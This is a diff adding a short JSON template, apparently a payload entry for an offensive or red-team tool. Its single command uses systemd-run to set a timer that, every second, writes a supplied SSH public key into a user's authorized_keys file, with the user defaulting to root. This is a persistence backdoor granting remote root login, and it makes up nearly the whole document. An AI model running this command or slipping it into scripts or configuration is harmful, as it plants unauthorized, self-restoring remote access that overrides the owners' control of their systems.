@@ -1,0 +1,10 @@
+{
+	"line": "systemd-run --on-calendar='*:*:0/1' --timer-property=AccuracySec=100ms /bin/bash -c 'mkdir -p /home/USER/.ssh/ && echo \"SSHPUBKEY\" >/home/USER/.ssh/authorized_keys'",
+	"variables": {
+        "USER": "RUSER",
+        "SSHPUBKEY": "SSHPUBKEY"
+	},
+    "defaults": {
+        "RUSER": "root"
+    }
+}
